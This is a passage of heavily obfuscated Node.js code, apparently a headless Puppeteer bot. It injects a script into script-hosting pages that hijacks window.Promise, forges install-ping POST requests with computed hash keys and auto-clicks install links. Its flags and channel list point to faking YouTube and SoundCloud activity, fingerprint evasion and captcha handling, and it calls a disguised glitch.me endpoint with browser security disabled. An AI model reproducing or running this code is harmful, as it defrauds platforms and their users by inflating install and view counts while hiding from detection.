y[-0xd31 + -0x420 + 0x1154 & N++], P[N >> -0x5a0 + 0x1a46 + -0x4 * 0x529] |= (-0x2542 * -0x1 + -0x155b + -0xf67 | L >> 0xa45 + 0x1767 + -0x8 * 0x434 & 0x1 * 0x1045 + 0x700 + -0x1706) << y[-0x1805 + -0xa3f + -0xc3 * -0x2d & N++], P[N >> 0x5 * 0x5b3 + 0x1997 + -0xd85 * 0x4] |= (-0x1d * -0x16 + 0x24e5 + -0x26e3 | L >> 0x17b * -0xe + -0xae9 + -0x1 * -0x1fa9 & 0x1f2f + 0x1036 * -0x2 + 0x17c) << y[-0x22 * -0x112 + -0x14e3 + -0xf7e & N++], P[N >> 0x115a * 0x2 + 0x6ca * 0x5 + -0x2 * 0x2252] |= (0x15b4 + 0x1b1f * -0x1 + 0xf * 0x65 | -0x1 * 0x1795 + -0x2111 * -0x1 + -0x37 * 0x2b & L) << y[0x2435 + 0x15fc + 0x1d17 * -0x2 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x7ee + 0x754 + -0xe2 * 0x11 ? (this['block'] = P[0x2 + -0x8bd + 0x8cb * 0x1], this['start'] = N - (0x3e0 + 0x1403 * -0x1 + 0x1063), this['hash'](), this['hashed'] = -0x7 * -0x41e + 0x24b + -0x16 * 0x16a) : this['start'] = N;
                }
                return this['bytes'] > -0x36fe * 0x10dbe + 0x30993 * -0x9d09 + -0x1 * -0x316ec33ae && (this['hBytes'] += this['bytes'] / (0x9d973038 + -0x453c26c * -0x42 + -0x1fb3 * 0x5e7b0) << -0x1eb2 + 0x254d + -0x13 * 0x59, this['bytes'] = this['bytes'] % (0x2a8c2 * 0x7a5a + 0x196f60fe4 + -0x1dc51d818)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0xb8e + -0x12a8 + 0x71b * 0x1;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x25a2 + 0x263f * 0x1 + -0x1 * 0x8d] = this['block'], J[K >> -0x1f3e + 0x3da * 0x1 + -0xe * -0x1f5] |= x[0x1 * 0x665 + -0x5e7 + 0x3 * -0x29 & K], this['block'] = J[0x1d3d + -0x1360 + -0x9cd * 0x1], K >= -0x221 * 0x5 + -0x1b7 * 0x6 + -0x5 * -0x43b && (this['hashed'] || this['hash'](), J[-0xa * -0x377 + -0x32b * -0x7 + -0xd * 0x45f] = this['block'], J[0x2 * 0x677 + 0x7a3 + -0x1481] = J[-0x5ec + -0x1177 + 0x1764] = J[0x1204 * 0x1 + -0x1b98 + 0x996 * 0x1] = J[0xa67 * -0x1 + -0xc07 + 0x3 * 0x77b] = J[0x13e8 + 0x205d + -0x1 * 0x3441] = J[-0x16a5 + 0xcce + -0x277 * -0x4] = J[0x249d + -0x242 * 0x3 + -0x1dd1] = J[0x6b6 + -0x17fa + 0x114b] = J[-0x2 * 0x1305 + 0x10 * 0x115 + 0x14c2] = J[0x215f + 0x369 + -0x24bf] = J[-0xf * -0x151 + 0x5 * 0x32d + -0x2396 * 0x1] = J[-0x2 * 0xacd + -0x35b * 0xa + 0x3733] = J[-0x219a + -0xd95 + 0x2f3b] = J[-0xb9e + -0x10e + 0xcb9 * 0x1] = J[0x2 * -0x1147 + -0xb3 * 0x22 + 0x3a62] = J[0x2671 * 0x1 + -0x11a6 + -0x2 * 0xa5e] = 0x20e9 + 0x1 * 0x313 + -0x23fc), J[-0xc23 * 0x2 + -0x12bf + 0x2b13] = this['hBytes'] << 0x1ab2 + 0x215c + -0x3c0b | this['bytes'] >>> -0xece + -0x22f + 0x111a * 0x1, J[-0xad5 * -0x1 + 0x2279 * -0x1 + 0x17b3] = this['bytes'] << -0x1 * -0x3f3 + -0x200e + 0x1c1e, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x12d + 0x1a9b * 0x1 + 0x6ee * -0x4; J < -0x6 * -0xa4 + -0x220d * 0x1 + -0x1e85 * -0x1; ++J)
                K = Q[J - (0x3f2 + -0x128e + 0xc5 * 0x13)] ^ Q[J - (-0x1 * 0xf7c + 0x6 * -0x65b + 0x7e * 0x6d)] ^ Q[J - (0x9 * -0x33 + 0x3 * -0x8a7 + 0x1bce)] ^ Q[J - (0x1 * 0x1e74 + 0x3 * -0x389 + 0x5 * -0x3f5)], Q[J] = K << -0x26e5 + 0x473 * 0x2 + 0x1e00 | K >>> -0xbb8 + -0x930 + 0x1507;
              for (J = 0x1 * 0xc9d + 0x9d3 + -0x1670; J < 0x1 * -0xdc3 + 0x34 * 0xad + -0x154d; J += 0xf55 + 0xfc4 + -0x1f14)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x343 * 0x7 + 0x1686 + -0x2a * -0x2 | L >>> 0x3f7 + 0x957 + -0xd33) + (M & N | ~M & O) + P + (-0xd59ae50 + -0x1 * -0xa4cdd822 + -0x3cf1b039) + Q[J] << 0x104f + 0x13 * 0x8b + -0x1aa0) << -0x5 * -0x28d + -0x12 * 0x21d + 0x1 * 0x194e | P >>> -0x49 * -0x2f + -0x2 * -0x3c + -0xdc4 * 0x1) + (L & (M = M << -0x129c + -0x18e5 + 0x2b9f | M >>> 0x1882 + 0x337 * 0x3 + -0x2225) | ~L & N) + O + (0xa3949bd9 + 0x6fe51530 + -0x4 * 0x2e3dcddc) + Q[J + (0x15a * 0x19 + 0x7b * 0x4c + -0x7 * 0xa0b)] << -0x11 * -0x13 + 0x1a17 + -0x1b5a) << -0x23b1 + -0x1 * 0x15f7 + 0x39ad | O >>> 0xa3b + 0x3 * 0x89 + -0xe7 * 0xd) + (P & (L = L << 0xd17 + 0x1616 + 0x703 * -0x5 | L >>> -0x962 + -0xd87 * -0x1 + -0x423) | ~P & M) + N + (-0x2174701f + -0x3f61244a + -0x5dac0701 * -0x2) + Q[J + (0xd65 + -0x1 * 0x1c4e + 0xeeb)] << 0x1121 * 0x1 + 0x1 * -0x15c3 + 0x4a2) << 0x1d2d + -0x161 * -0x4 + -0x22ac | N >>> -0xb30 + 0x141 + -0x101 * -0xa) + (O & (P = P << -0x3 * 0x1da + -0xbe5 + 0x1191 | P >>> 0x14e5 + 0x184c + -0x10d * 0x2b) | ~O & L) + M + (0x28ae99e1 + -0x3940d1ed + -0x6b14b1a5 * -0x1) + Q[J + (-0x1 * -0xbda + -0x1 * 0x284 + -0x953)] << 0x2058 + -0x1531 + 0x5 * -0x23b) << -0x1 * 0x506 + 0x47 * -0x79 + -0x36 * -0xb7 | M >>> -0xfd2 + -0x2536 + 0x3523 * 0x1) + (N & (O = O << -0x17c0 + -0x1029 + -0x1 * -0x2807 | O >>> -0x1 * 0x1ba7 + 0x1e81 + -0x2 * 0x16c) | ~N & P) + L + (-0x4 * 0x1d074147 + 0x932c523d + 0x3b732c78) + Q[J + (-0x95 + 0x2055 * -0x1 + -0x2 * -0x1077)] << 0x5 * -0x5e + -0x1 * -0x24de + 0x3b * -0x98, N = N << -0x1315 + 0x145d + 0x12a * -0x1 | N >>> 0x9ec + -0x1421 + -0x1 * -0xa37;
              for (; J < 0xc * 0x43 + 0x9d4 + 0x29 * -0x50; J += -0x1ac9 + -0x162 * -0x8 + 0x41 * 0x3e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x7 * -0x127 + 0x1 * -0x863 + 0x57 * 0x1 | L >>> 0x1 * -0x1163 + -0x5 * 0x15e + 0x1854) + (M ^ N ^ O) + P + (0x526497d7 * -0x1 + 0x984e7fbb + 0x28f003bd) + Q[J] << 0x527 * -0x3 + 0x3f * -0x42 + 0x1fb3) << 0x13e5 + -0x1 * 0xb8f + 0x1 * -0x851 | P >>> 0x1136 * 0x2 + -0x3 * 0x38f + 0x17a4 * -0x1) + (L ^ (M = M << -0x26cb + 0xaf * -0x4 + 0x29a5 | M >>> -0x1 * 0x403 + 0xcf * -0x26 + -0x3 * -0xb95) ^ N) + O + (-0x7c164b59 * 0x1 + 0x1efea676 + 0x4db15ba * 0x2a) + Q[J + (-0xde4 + -0xc8b + 0x1a70)] << -0x4 * 0x611 + 0xa * -0x243 + 0x11 * 0x2c2) << 0x1095 * -0x2 + 0x1 * -0x1190 + -0x32bf * -0x1 | O >>> 0x157c + 0x13cd + -0x292e) + (P ^ (L = L << -0x1 * -0x4c1 + 0x1273 * -0x1 + 0xdd0 | L >>> 0xb2 * 0x1c + -0x119 * -0x19 + -0x2ee7 * 0x1) ^ M) + N + (0x49d43e7 * 0x1c + -0x472ddec1 + 0x3 * 0x119c1f0a) + Q[J + (-0x1e42 + 0x8ff + 0x1545)] << -0x1 * -0x7d5 + 0x1 * 0x2245 + -0x2a1a) << 0x15f7 + -0x5c * 0x9 + -0x3be * 0x5 | N >>> 0x1 * -0x669 + -0x1a91 + 0x2115) + (O ^ (P = P << -0x137b + -0x1 * 0x4f + 0x2d8 * 0x7 | P >>> 0x26b7 + 0x758 * 0x1 + -0x2e0d) ^ L) + M + (-0x28a875aa + -0x7ce3c34f + 0x11466249a) + Q[J + (0x154e + 0x9be + -0x1f09)] << -0x2434 + -0x12c + 0x68 * 0x5c) << -0x2 * -0x43c + 0x1074 + -0x18e7 | M >>> 0x6 * -0x219 + -0x1a54 * 0x1 + 0x2705) + (N ^ (O = O << 0x1 * 0x7cb + -0x6ec * -0x1 + -0x1 * 0xe99 | O >>> -0x10d4 + -0x5fe * 0x2 + 0x1cd2) ^ P) + L + (0xc0b8673 * -0x5 + 0x5a4b007f + 0x50c88b61) + Q[J + (0x205 + -0x1 * -0x89f + -0x10 * 0xaa)] << 0x7b8 + 0x1 * -0x542 + -0x276, N = N << 0x2051 + 0x11 * 0x10d + 0x858 * -0x6 | N >>> -0x1b4f * -0x1 + 0x10 * 0x6b + 0x317 * -0xb;
              for (; J < -0x165d + -0x1 * -0x1f6c + -0x8d3; J += 0x3f1 + -0x1 * -0x14b9 + -0x18a5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1d49 + 0x1358 + 0x9f6 | L >>> 0xd14 + -0x25df + 0x2 * 0xc73) + (M & N | M & O | N & O) + P - (-0x98942a82 + 0x4 * 0x2ce19eff + 0xb * 0x7d02d3e) + Q[J] << 0x118d * 0x2 + 0x247a + -0x4794) << 0x1769 + -0x1f0a + 0x7a6 | P >>> -0x2 * -0x1f0 + 0x1 * -0xcae + -0x1 * -0x8e9) + (L & (M = M << -0x3f2 + -0x1c5 * -0x8 + -0x50c * 0x2 | M >>> 0x1f76 + -0x71e + 0x5 * -0x4de) | L & N | M & N) + O - (-0x6c72a3a9 + -0xd95b256b + 0x1b6b20c38) + Q[J + (0x13 * 0x32 + -0x2429 * -0x1 + -0x27de)] << 0x19e1 + 0xf1f + 0xa40 * -0x4) << 0x1 * 0x1933 + -0x1 * 0x86b + -0x10c3 | O >>> -0x187f + 0x8 * -0x45 + -0x89 * -0x32) + (P & (L = L << -0x2 * -0x683 + -0xdf * 0x28 + 0x138 * 0x12 | L >>> -0x1 * -0x2095 + 0x8d3 + -0x2f5 * 0xe) | P & M | L & M) + N - (-0x1dd28 * -0x34a5 + 0x1d367932 + 0x2e3935e * -0x5) + Q[J + (-0x1cac + -0x4 * 0x5cf + -0x1bb * -0x1e)] << 0x3 * 0xa21 + -0x19b * 0x9 + -0xff0) << -0x1 * 0x13f7 + 0x7 * 0x329 + 0x223 * -0x1 | N >>> 0x181b + 0x43 * 0x21 + -0x20a3) + (O & (P = P << -0x28 * -0xf7 + -0xf * 0x3 + 0x5 * -0x7a9 | P >>> 0x1206 + -0x8e5 + -0x91f) | O & L | P & L) + M - (0x2 * 0x6f27d445 + -0x98f6 * -0x12962 + -0x11f1b5992) + Q[J + (-0x1b8f + -0x1b7f * -0x1 + 0x1 * 0x13)] << 0x161 * 0x13 + 0x1376 + -0x2da9) << -0x108 * -0x1e + -0x2627 + -0x1cf * -0x4 | M >>> -0x7e0 + -0x2283 + 0x2a7e) + (N & (O = O << -0x479 * 0x2 + 0x1882 + -0xf72 | O >>> 0xec4 * -0x2 + 0x1b8b + 0x49 * 0x7) | N & P | O & P) + L - (0x995c1521 + 0x333c4aac + -0x5bb41ca9) + Q[J + (-0x64d * -0x4 + -0x118 * 0x14 + -0x4 * 0xd4)] << -0x63 * -0x56 + 0x4 * 0x1bd + -0x2836, N = N << 0xccd + -0x1 * -0xbbe + -0x186d | N >>> -0x10 * -0x217 + 0x1082 + -0x31f0;
              for (; J < -0xe3b * 0x1 + 0xa35 * -0x2 + -0x22f5 * -0x1; J += 0x32 * 0x68 + 0x2193 * 0x1 + -0x35de)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1f5 + -0x3d * 0x12 + 0x644 | L >>> 0x11c0 + -0x23fa + 0xf7 * 0x13) + (M ^ N ^ O) + P - (0x65b34926 + 0xd58a1 * 0x391 + -0x5faf212d) + Q[J] << 0x263e + 0x3 * -0x2a0 + -0x1e5e) << 0x215f + -0x512 + -0x1c48 | P >>> 0x1bd7 * -0x1 + 0x1 * 0x1e7 + -0x1 * -0x1a0b) + (L ^ (M = M << 0x1609 + 0x121 * 0xc + -0x2377 | M >>> -0x1d16 + 0x58f * -0x1 + 0x22a7) ^ N) + O - (0x4195ea * 0x35 + 0x587c5562 + 0x32df2 * -0xf3d) + Q[J + (-0x1 * -0x1424 + -0x196d * -0x1 + -0x1 * 0x2d90)] << 0x11b2 + 0x3 * -0xb2d + 0xfd5) << -0x1 * 0x1ba7 + -0x240c + 0x4 * 0xfee | O >>> -0x3b * 0x8d + -0x1b6e + 0x388 * 0x11) + (P ^ (L = L << 0x14ef + -0x1cda + -0xbb * -0xb | L >>> 0x24d * 0x7 + 0x213a + -0x3153) ^ M) + N - (-0x10f * 0x105c5 + -0x39d706e7 + 0x7089609c) + Q[J + (-0x108a + -0x178a + 0x2816)] << 0xdf7 + 0x1049 + -0x1e40) << -0x8d5 + -0x10 * 0xf1 + 0x17ea | N >>> -0x7 * 0xaa + 0x1c2b + -0x3 * 0x7ce) + (O ^ (P = P << -0x1cd9 + -0x112 * -0x7 + 0xef * 0x17 | P >>> -0x22 * 0x67 + 0x37 * 0x65 + -0x803) ^ L) + M - (-0x2c9 * 0xf9389 + -0x2c1bdad * 0x23 + 0xc17c1562) + Q[J + (0x1ca2 + 0x201 + 0x4 * -0x7a8)] << -0x1a1b + 0x2463 * 0x1 + -0xa48) << -0x308 * -0xc + 0x2448 + -0x48a3 | M >>> -0x1ee5 * -0x1 + -0x2596 + 0x6cc) + (N ^ (O = O << -0xc15 + 0xb0c * -0x1 + 0x173f | O >>> 0xbc * 0xb + -0x18a7 * -0x1 + -0x20b9 * 0x1) ^ P) + L - (-0x2b3b335f + 0x1 * 0x22f3515a + -0x1 * -0x3de5202f) + Q[J + (0x1195 + 0x1 * -0x22e5 + -0x8aa * -0x2)] << -0x229f + 0xc8b + 0x9 * 0x274, N = N << 0x122 * 0x16 + -0x1c * -0x14f + 0xa * -0x625 | N >>> 0x1 * 0x1ec1 + 0x121c * 0x1 + 0x21 * -0x17b;
              this['h0'] = this['h0'] + L << 0x853 * -0x1 + 0x266e + -0x1e1b, this['h1'] = this['h1'] + M << 0x2 * -0x513 + -0x249e + 0x2ec4, this['h2'] = this['h2'] + N << -0x3bd + 0x33f + -0x7e * -0x1, this['h3'] = this['h3'] + O << -0x24e7 + 0x418 + 0x1 * 0x20cf, this['h4'] = this['h4'] + P << -0x6 * 0x473 + -0x32b * -0x5 + -0x18d * -0x7;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0xa3 * 0x21 + 0xe2e + -0x2315 & -0x131d + -0xd * -0xc5 + 0x92b] + w[J >> -0x4 * -0x824 + 0x2031 * -0x1 + 0x47 * -0x1 & -0x2 * -0x1078 + -0x2095 + -0x4c * 0x1] + w[J >> -0x8dc + -0x2493 * 0x1 + 0x2d83 & -0x41 * -0x38 + -0x271 * 0x6 + 0x7d] + w[J >> -0x65 * -0x42 + -0x2 * 0xba8 + 0x16 * -0x1f & 0x5 * 0x1af + -0x9f8 + 0x19c] + w[J >> 0x70f + 0x2663 + -0x2d66 & -0x825 + 0x1bd0 + -0xa * 0x1f6] + w[J >> 0x2113 + -0x2db + -0x1e30 & 0x18d * 0x7 + -0x11ad + -0x1 * -0x6e1] + w[J >> -0x3 * 0x943 + -0x1da9 + -0x3976 * -0x1 & -0x1 * -0x6d7 + 0xa3 * -0x7 + -0x11 * 0x23] + w[-0x201c + -0x16b5 * 0x1 + 0x36e0 & J] + w[K >> 0x2 * 0x787 + -0x1361 * -0x1 + 0x12f * -0x1d & 0x684 + -0x124a + -0xe9 * -0xd] + w[K >> -0x1e64 + -0x131e + -0x1 * -0x319a & 0xdf * -0x1d + -0x2 * -0xd47 + -0x2 * 0x9e] + w[K >> -0x216 * -0xc + -0x18ee * -0x1 + 0x31e2 * -0x1 & -0x20a1 + -0x1b74 + -0x1 * -0x3c24] + w[K >> -0x21b1 + -0x26e4 + 0x48a5 & -0x1 * 0x3d1 + -0x2524 + 0x2904] + w[K >> -0x26c5 + 0x13a * -0x14 + 0x3f59 * 0x1 & 0x1 * 0x25f2 + -0x1560 + -0x1083] + w[K >> -0x1121 * 0x1 + -0x1f0b + 0x3034 & -0xf5 + 0x2 * 0x7c0 + -0x4d4 * 0x3] + w[K >> -0xdb8 + -0x94 * 0x8 + 0x125c & -0x1304 + 0xf42 + 0x3d1] + w[-0x26 * -0x17 + 0x1681 + 0x296 * -0xa & K] + w[L >> -0x21c6 + -0x17eb + -0x1 * -0x39cd & 0x5 * -0x4e1 + 0x7 * 0x2f0 + 0x3e4] + w[L >> 0x6 * 0x7f + -0x53 * -0x1f + -0xcef & -0x1 * 0x130a + 0xc1f + 0x37d * 0x2] + w[L >> 0x4 * -0x9ad + 0xf13 + 0x11 * 0x165 & 0x1e17 + -0x112 * 0x1 + -0x1cf6] + w[L >> -0x3 * -0x106 + 0x1 * 0x1ff3 + -0x22f5 & -0xad6 + -0x1 * -0x149e + -0x83 * 0x13] + w[L >> -0x4 * -0xc0 + 0x1e4c + -0x2140 & -0x25 * 0x1d + 0xd * -0x186 + 0xc07 * 0x2] + w[L >> -0x99b + -0x20ac + -0x1 * -0x2a4f & -0x81c + 0x2 * 0x82 + 0x1 * 0x727] + w[L >> 0x2 * -0x792 + 0x1c83 + -0xd5b & -0x1 * -0x6c5 + 0x674 + -0xd2a] + w[-0x216d + 0x8e1 + 0x189b & L] + w[M >> -0x2243 + -0x1 * -0x24b5 + -0x256 & -0x226f * -0x1 + 0x8 * -0xfe + -0x1a70] + w[M >> 0x213 * -0x2 + -0x13 * -0x2 + 0x1 * 0x418 & -0x1 * -0x1421 + -0x86 * -0x2b + -0x14 * 0x221] + w[M >> 0x1abb * -0x1 + -0x567 + -0x13 * -0x1b2 & -0x1 * -0x1c88 + 0x274 + -0x1eed] + w[M >> -0x7 * -0x502 + 0x1c6 + -0x24c4 & 0x404 + 0x1b37 * 0x1 + 0x10a * -0x1e] + w[M >> -0xc13 * -0x1 + -0xdcb + 0x4 * 0x71 & -0x2001 * -0x1 + 0xb09 * -0x1 + -0x35 * 0x65] + w[M >> -0x18a0 + 0xeb * -0xd + 0x1ed * 0x13 & -0xb6b + -0x1ca1 + 0x1 * 0x281b] + w[M >> 0xae8 + -0x2 * 0x12c1 + 0x1a9e & -0x1f * 0x19 + -0x1ddc + -0x20f2 * -0x1] + w[-0xa * -0x16f + -0x22a0 + -0x1459 * -0x1 & M] + w[N >> 0xa9e + 0xe * 0x21a + -0x13 * 0x21a & -0x124 + 0x23ba + -0x2287] + w[N >> 0x199a + -0x21fc + 0x87a * 0x1 & -0x6fb * -0x4 + -0x9 * 0x348 + 0x1ab] + w[N >> -0xafa + -0x2 * -0x124f + 0x4 * -0x664 & 0x79 * 0x29 + -0x53f * 0x1 + 0x3 * -0x4b1] + w[N >> 0x280 + 0x16fe + 0x9b * -0x2a & 0x81 * 0x3b + -0x189 + -0x1c23] + w[N >> -0x5fb + 0x16b0 + 0x355 * -0x5 & -0x21c4 + -0x59d * -0x3 + -0x2 * -0x87e] + w[N >> -0xd * -0x12 + -0x6 * -0x19b + -0x2 * 0x542 & 0xb75 + -0x1d3b + 0x37 * 0x53] + w[N >> -0x1 * -0x1e23 + -0x6cb + -0x1754 & -0x3d5 * -0x3 + 0x3 * 0x923 + -0x5 * 0x7c5] + w[-0x18ba + -0x4 * -0x321 + -0x15d * -0x9 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1411 + 0x44f * 0x1 + 0x7ed * 0x2 & -0x40f * -0x1 + 0x4 * -0x349 + 0xa14,
                J >> 0x37 * 0x79 + 0x1696 * 0x1 + -0x3085 & -0x1 * -0xdd9 + 0x188 * 0x12 + -0x286a,
                J >> 0x4 * 0x2d3 + 0x11a5 + -0x3 * 0x9a3 & 0x1 * -0x395 + 0x19 * 0xc3 + -0x7 * 0x211,
                -0x2 * -0xeb7 + -0xe38 + -0xe37 & J,
                K >> 0xa23 * 0x1 + -0x7ab + -0x10 * 0x26 & 0x68e + -0x1e8a + -0x5 * -0x4ff,
                K >> 0x89a * -0x1 + 0x3a6 + 0x504 & 0xb * 0x17f + 0xa50 + 0x19c6 * -0x1,
                K >> -0x1c8c + 0x9d9 + 0x2ad * 0x7 & -0x13f * -0x17 + -0x22 * -0x116 + -0x4096,
                -0x2 * 0xe72 + 0x108e + -0x1 * -0xd55 & K,
                L >> 0x24fd + -0x22be + 0x1 * -0x227 & 0x64 * 0x35 + 0x4 * 0x5fb + -0x11 * 0x291,
                L >> 0x1b6a + -0x7f * 0x3 + -0x19dd & 0xf9 + -0x1670 + 0x19 * 0xe6,
                L >> -0x5b7 + 0x10d9 + -0xb1a & -0xdd5 + 0x2449 + -0x727 * 0x3,
                0x127 + -0x36f * -0x6 + -0x14c2 & L,
                M >> 0xd94 + -0x265f + 0x18e3 & 0x4f9 * -0x7 + 0x1c56 + 0x3bc * 0x2,
                M >> -0x15a * 0x12 + 0xd * 0x26a + -0x6fe * 0x1 & -0x1521 + 0x26a9 + 0x11 * -0xf9,
                M >> -0x26fe + 0x78d + -0x1 * -0x1f79 & 0x275 * 0x7 + -0x1539 * -0x1 + 0x8f * -0x43,
                -0xa83 + -0x10bc + 0x1c3e & M,
                N >> -0x5 * 0x317 + -0x1 * 0x8de + 0x1869 & 0x56 * -0x4 + -0x3 * 0x3ea + 0xe15,
                N >> 0x24ff + 0x9d1 + -0x2ec0 & -0x238f + 0x11fc + -0x1292 * -0x1,
                N >> 0x17 * -0x171 + -0x1 * -0x161 + -0x2 * -0xfe7 & 0x1e90 + -0x931 + 0x8 * -0x28c,
                0x12be * -0x1 + 0x108 + 0x12b5 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x2318 * 0x1 + -0x1 * 0x247b + 0x177), (K = new DataView(J))['setUint32'](-0x1fb8 + -0x1f * 0x84 + -0x47 * -0xac, this['h0']), K['setUint32'](0xf29 + -0x144c + -0x1 * -0x527, this['h1']), K['setUint32'](-0x2103 + -0x30a + -0x1 * -0x2415, this['h2']), K['setUint32'](-0x2 * -0xc5 + 0x2 * 0x42 + -0x202, this['h3']), K['setUint32'](-0x20e1 * -0x1 + -0x22e5 + -0x214 * -0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x170d + 0x6fe * 0x5 + -0xbe9];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x89c + 0x8a5 * -0x3 + 0x228b;
            J[-0x10df + 0x2a5 * -0x7 + 0x2362]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x35 * 0x52 + -0x263c + -0x3736 * -0x1] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0xf43 + -0x10 * 0xe6 + 0x21e * 0xe), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x22b + -0x1 * 0xec6 + 0x10f2;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x634 * -0x2 + 0x1ea * -0x7 + 0x36d * 0x2), Promise['resolve'](-0x2696 + -0x20cb + 0x4762);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1 * 0x82f + 0x4e5 * 0x4 + -0x1 * 0xb65; j < -0x1e56 + 0x820 + 0x1637; j++)
    i();
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1bab + -0x1 * -0xde7 + 0xdc4);
    let h = e[f];
    return h;
  }, d(b, c);
}
const NETWORK_PATIENCE = -0x43 * -0x7c + 0x6b * -0x1a + 0x9aa * 0x1 + (-0x1f6 * -0x8 + -0x177d + 0x13 * 0x107) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x268d + -0x138b + 0x36b * 0x11) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + T(0x11, 'u@wx'),
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x8fb * -0x2 + 0x82a + 0x9cc; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
